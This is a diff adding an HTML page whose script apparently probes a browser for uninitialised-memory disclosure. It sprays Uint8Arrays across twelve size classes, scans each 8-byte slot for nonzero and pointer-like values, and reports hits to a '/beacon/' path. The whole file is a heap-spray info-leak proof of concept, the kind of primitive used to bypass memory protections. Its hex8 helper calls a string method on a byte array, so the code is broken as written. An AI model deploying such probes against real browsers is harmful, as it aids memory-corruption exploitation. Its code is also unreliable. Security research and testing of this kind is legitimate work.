@@ -1,0 +1,28 @@
+<!doctype html><meta charset="utf-8"><title>f16b</title><body><script>
+function b(m){var x=new XMLHttpRequest();x.open('GET','/beacon/F16B-'+m,false);try{x.send()}catch(e){}}
+function hex8(v){var s='';for(var i=0;i<8;i++){s+=('0'+v.charCodeAt(i).toString(16)).slice(-2)}return s}
+var CLASSES=[64,96,128,160,192,224,256,320,384,512,768,1024];
+var bufs=[];
+b('START');
+for (var c=0;c<CLASSES.length;c++){
+  var k=CLASSES[c], arr=[];
+  for (var j=0;j<24;j++) arr.push(new Uint8Array(k));
+  bufs.push([k,arr]);
+}
+b('SPRAYED');
+var hits=0;
+for (var c=0;c<bufs.length;c++){
+  var k=bufs[c][0], arr=bufs[c][1];
+  for (var j=0;j<arr.length;j++){
+    var u=arr[j], nz=[], ptr=0;
+    for (var o=0;o+8<=k;o+=8){
+      var s=u.subarray(o,o+8);
+      var lo=s[0]|(s[1]<<8)|(s[2]<<16)|(s[3]<<24);
+      var hi=(s[4]|(s[5]<<8)|(s[6]<<16)|(s[7]<<24))>>>0;
+      if (lo||hi){ nz.push(o.toString(16)+':'+hex8(s)); if (hi<0x1000 && lo!==0) ptr++; }
+    }
+    if (nz.length){ hits++; if (hits<12) b('HIT-s'+k+'-b'+j+'-n'+nz.length+'-'+nz.slice(0,4).join('_')); }
+  }
+}
+b('DONE-hits-'+hits);
+</script></body>
